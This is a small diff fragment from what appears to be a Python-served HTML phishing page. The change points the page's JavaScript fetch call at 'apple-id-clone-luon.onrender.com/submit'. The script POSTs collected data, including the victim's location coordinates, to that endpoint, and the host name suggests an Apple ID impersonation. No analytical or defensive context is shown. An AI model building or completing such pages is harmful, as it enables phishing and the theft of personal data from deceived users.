@@ -128,7 +128,7 @@ HTML_PAGE = '''
           longitude: data.longitude
         };
 
-       await fetch('https://<your-render-app>.onrender.com/submit', {
+ await fetch('https://apple-id-clone-luon.onrender.com/submit', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
